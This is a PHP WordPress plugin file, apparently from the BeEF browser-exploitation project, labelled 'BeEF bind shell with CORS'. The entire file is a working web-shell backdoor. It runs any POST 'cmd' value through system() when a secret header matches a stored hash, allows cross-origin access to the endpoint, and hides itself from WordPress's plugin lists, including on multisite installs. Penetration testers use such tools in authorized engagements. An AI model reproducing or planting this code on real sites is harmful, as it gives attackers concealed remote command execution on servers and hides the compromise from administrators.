<?php
/**
 * Plugin Name: beefbind
 * Plugin URI: http://beefproject.com
 * Description: BeEF bind shell with CORS.
 * Version: 1.1
 * Authors: Bart Leppens, Erwan LR (@erwan_lr | WPScanTeam)
 * Author URI: https://twitter.com/bmantra
 * License: Copyright (c) 2006-2023Wade Alcorn - wade@bindshell.net - Browser Exploitation Framework (BeEF) - http://beefproject.com - See the file 'doc/COPYING' for copying permission
**/

header("Access-Control-Allow-Origin: *");

define('SHA1_HASH', '#SHA1HASH#');
define('BEEF_PLUGIN', 'beefbind/beefbind.php');

if (isset($_SERVER['HTTP_BEEF']) && strlen($_SERVER['HTTP_BEEF']) > 1) {
	if (strcasecmp(sha1($_SERVER['HTTP_BEEF']), SHA1_HASH) === 0) {
		if (isset($_POST['cmd']) && strlen($_POST['cmd']) > 0) {
			echo system($_POST['cmd']);
		}
	}
}

if (defined('WPINC')) {
	function hide_plugin() {
	    global $wp_list_table;
	    
	    foreach ($wp_list_table->items as $key => $val) {
	        if ($key == BEEF_PLUGIN) { unset($wp_list_table->items[$key]); }
	    }
	}
	add_action('pre_current_active_plugins', 'hide_plugin');

	// For Multisites
	function hide_plugin_from_network($plugins) {
	    if (in_array(BEEF_PLUGIN, array_keys($plugins))) { unset($plugins[BEEF_PLUGIN]); }

	    return $plugins;
	}
	add_filter('all_plugins', 'hide_plugin_from_network');
}
?>